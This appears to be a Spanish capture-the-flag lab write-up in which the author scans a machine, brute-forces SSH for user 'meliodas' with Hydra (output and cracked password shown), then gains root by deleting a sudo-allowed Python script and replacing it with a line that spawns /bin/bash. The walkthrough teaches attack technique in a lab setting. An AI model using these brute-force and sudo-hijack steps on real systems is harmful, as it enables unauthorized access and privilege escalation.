
# SCAN
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

# PUERTO 80
Tiene un formulario para mandar comentario pero realmente no hace nada (es un end). Lo unico que nos puede valer es que hay
un usuario que se llama "meliodas" que ha mandado 3 comentarios

# HYDRA
Probamos un ataque de fuerza bruta utilizando como usuario "meliodas". Inmediatamente obtenemos el password:
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-21 12:59:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.43.38:22/
 [STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344223 to do in 1335:36h, 16 active
[22][ssh] host: 10.10.43.38   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```
Con este password podemos autentificarnos en ssh conseguimos el flag de usuario

# PRIVILEGE ESCALATION

En el directorio del usuario "meliodas" (/home/meliodas) hay un script de python "bak.py" creado por root que parece prometedor.
```
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

El script lo que hace es: La funcion zipdir comprime en un archivo /var/backups/website.zip, mediante un objeto ZipFile de la libreria zipfile, todos los ficheros que estan bajo el directorio que se le pasa como primer argumento (en este caso /var/www/html)

# SUDO 
Podemos ver que programas puede ejecutar el usuario meliodas bajo sudo:

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
ojo esto no quiere decir que el usuario meliodas pueda ejecutar cualquier script de python bajo sudo, sino que puede ejecutar con cualquier
version de python (python*) el script /home/meliodas/bak.py (pero solo este)
Otra cosa que puede llamar la atención es que se pueda borrar bak.py cuando bak.py es de root. Esto es asi porque bak.py esta en el directorio /home/meliodas/ en el cual el usuario meliodas tiene privilegios -x lo que le permite borrar cualquier fichero

Dicho esto lo siguiente es muy facil:
1. Borramos el script bak.py original

> $ rm -rf /home/meliodas/bak.py

2. Creamos un nuevo script bak.py con un shell
- import os; os.system("/bin/bash")
- import subprocess; subprocess.call ("/bin/bash")

Con esto obtenemos un root shell y el resto es obvio
